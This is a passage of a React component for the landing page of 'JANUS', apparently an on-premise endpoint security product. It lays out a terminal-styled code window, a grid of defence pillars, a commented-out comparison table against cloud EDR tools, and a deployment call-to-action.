                  </div>
                </div>
              </div>

              {/* Right Column: Code / Terminal Inspection Window */}
              <div className="lg:col-span-5 w-full">
                <div className="rounded-2xl bg-[#110717] border border-purple-500/30 shadow-2xl overflow-hidden text-left font-mono">
                  {/* Window Bar */}
                  <div className="px-4 py-3 bg-[#180a22] border-b border-white/10 flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="w-2.5 h-2.5 rounded-full bg-purple-400" />
                      <span className="text-xs text-white/60">janus-host-auditor.sh</span>
                    </div>
                    <span className="text-[10px] text-purple-300 uppercase tracking-wider bg-purple-900/30 px-2 py-0.5 rounded border border-purple-500/20">
                      Telemetry Stream
                    </span>
                  </div>
                  {/* Code Body */}
                  <pre className="p-5 text-xs text-purple-200/90 leading-relaxed overflow-x-auto whitespace-pre font-mono">
                    <code>{currentTab.codeSnippet}</code>
                  </pre>
                  {/* Status Footer */}
                  <div className="px-4 py-2 bg-black/40 border-t border-white/5 flex items-center justify-between text-[10px] text-white/40">
                    <span>Audit Pipeline: Active</span>
                    <span className="text-emerald-400 flex items-center gap-1.5">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                      Live Host Protection
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Section 4: Deterministic Host Defense Pillars Grid (6 Pillars) */}
      <section id="architecture" className="w-full py-24 sm:py-32 px-6 sm:px-12 lg:px-16 border-t border-white/10 bg-[#14081c]/50">
        <div className="max-w-7xl mx-auto">
          {/* Section Header */}
          <div className="max-w-4xl mb-16">
            <h2 className="text-3xl sm:text-5xl lg:text-6xl font-normal tracking-tight text-white leading-[1.15]">
              Endpoint Defense at Your Fingertips:{" "}
              <span className="bg-gradient-to-r from-purple-200 via-purple-300 to-indigo-200 bg-clip-text text-transparent">
                Monitor, Protect, and Secure Every Device in Real Time
              </span>
            </h2>
            <h3 className="text-xl sm:text-2xl font-light text-purple-300 mt-5 leading-snug">
              Protect your laptops and servers — 100% on-premise with zero cloud leaks
            </h3>
            <p className="text-base sm:text-lg text-white/75 font-light mt-4 leading-relaxed max-w-4xl">
              Keep full control over your endpoint security data. JANUS monitors system activity, stops malicious attacks, and isolates compromised machines directly within your private network without sending any data to outside clouds.
            </p>
          </div>

          {/* 6-Card Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 sm:gap-8">
            {DEFENSE_PILLARS.map((item, idx) => (
              <div
                key={idx}
                className="p-8 rounded-3xl bg-gradient-to-b from-white/[0.06] to-white/[0.01] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group flex flex-col"
              >
                <div className="flex items-center justify-end mb-4">
                  <span className="font-mono text-xs text-white/30">
                    0{idx + 1}
                  </span>
                </div>
                <h3 className="text-xl font-medium text-white mb-3 group-hover:text-purple-200 transition-colors leading-snug">
                  {item.title}
                </h3>
                <p className="text-sm text-white/70 font-light leading-relaxed">
                  {item.description}
                </p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Section 5: Why Sovereign Endpoint Security Wins (Comparison Table) (Commented Out) */}
      {/*
      <section id="comparison" className="w-full py-24 sm:py-32 px-6 sm:px-12 lg:px-16 relative overflow-hidden">
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[48rem] h-[28rem] bg-purple-600/10 rounded-full blur-[140px] pointer-events-none" />

        <div className="max-w-7xl mx-auto relative z-10">
          <div className="max-w-3xl mb-16 text-center mx-auto">
            <h2 className="text-3xl sm:text-5xl lg:text-6xl font-normal tracking-tight text-white leading-tight">
              Why Sovereign Endpoint Security{" "}
              <span className="bg-gradient-to-r from-purple-200 via-purple-300 to-indigo-200 bg-clip-text text-transparent">
                Wins
              </span>
            </h2>
            <p className="text-base sm:text-lg text-white/60 font-light mt-4 max-w-2xl mx-auto leading-relaxed">
              Compare JANUS with cloud-dependent EDR solutions across telemetry residency, agent footprint, infrastructure correlation, and pricing models.
            </p>
          </div>

          <div className="rounded-3xl bg-[#14081c]/90 border border-white/10 overflow-hidden shadow-[0_25px_70px_rgba(0,0,0,0.7)] backdrop-blur-xl">
            <div className="overflow-x-auto">
              <table className="w-full text-left text-sm font-light border-collapse">
                <thead>
                  <tr className="border-b border-white/10 bg-white/[0.02]">
                    <th className="py-6 px-6 sm:px-8 text-white/50 font-mono text-xs uppercase tracking-wider w-[30%]">
                      Criterion &amp; Architecture
                    </th>
                    <th className="py-6 px-6 sm:px-8 text-white font-semibold text-base sm:text-lg w-[35%] bg-purple-900/20 border-x border-purple-500/20">
                      <div className="flex items-center justify-between">
                        <span>JANUS Sovereign Endpoint</span>
                        <span className="px-3 py-1 rounded-full text-[10px] font-mono tracking-wider uppercase font-semibold bg-purple-500/30 text-purple-200 border border-purple-400/40 shadow-[0_0_12px_rgba(168,85,247,0.35)]">
                          Air-Gapped
                        </span>
                      </div>
                    </th>
                    <th className="py-6 px-6 sm:px-8 text-white/60 font-medium text-base sm:text-lg w-[35%]">
                      Cloud-Brokered EDR (CrowdStrike / Defender)
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5">
                  {COMPARISON_ROWS.map((row, idx) => (
                    <tr key={idx} className="hover:bg-white/[0.02] transition-colors">
                      <td className="py-6 px-6 sm:px-8 align-top">
                        <div className="text-white font-medium text-base mb-1">
                          {row.criterion}
                        </div>
                        <div className="text-xs text-white/50 font-mono">
                          {row.sub}
                        </div>
                      </td>
                      <td className="py-6 px-6 sm:px-8 align-top bg-purple-900/10 border-x border-purple-500/20">
                        <div className="text-purple-300 font-semibold text-sm mb-1 flex items-center gap-2">
                          <span>✓</span>
                          <span>{row.janusPrimary}</span>
                        </div>
                        <div className="text-xs text-white/80 font-light leading-relaxed">
                          {row.janusSecondary}
                        </div>
                      </td>
                      <td className="py-6 px-6 sm:px-8 align-top text-white/60">
                        <div className="text-white/80 font-medium text-sm mb-1 flex items-center gap-2">
                          <span className="text-red-400/80">✗</span>
                          <span>{row.legacyPrimary}</span>
                        </div>
                        <div className="text-xs text-white/50 font-light leading-relaxed">
                          {row.legacySecondary}
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </section>
      */}

      {/* Section 6: Direct Lab Deployment CTA */}
      <section id="poc" className="w-full py-24 px-6 sm:px-12 lg:px-16 border-t border-white/10 bg-theme-gradient-b text-center">
        <div className="max-w-4xl mx-auto">
          <h2 className="text-3xl sm:text-5xl font-bold tracking-tight text-white mb-6">
            Lock Down Endpoints on Sovereign Hardware
          </h2>
          <p className="text-base sm:text-lg text-white/70 font-light max-w-2xl mx-auto mb-10 leading-relaxed">
            Deploy self-contained EDR agents across Windows and Linux workstations in minutes. Zero cloud telemetry egress, instantaneous port-level quarantine.
          </p>
          <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
            <a
              href="#overview"
              className="px-9 py-4 rounded-full bg-white text-janus-bg font-mono text-xs font-bold uppercase tracking-widest hover:bg-purple-100 transition-all duration-300 shadow-[0_0_35px_rgba(255,255,255,0.4)] hover:scale-105 active:scale-95 cursor-pointer"
            >
              Deploy on Ubuntu Server
            </a>
            <a
              href="#capabilities"
              className="px-8 py-4 rounded-full bg-white/10 hover:bg-white/20 text-white font-mono text-xs uppercase tracking-widest border border-white/20 transition-all duration-300 hover:scale-105 active:scale-95 cursor-pointer"
            >
              Schedule Technical Walkthrough
            </a>
          </div>
        </div>
      </section>

      {/* Footer */}
      <Footer />
    </div>
  );
}
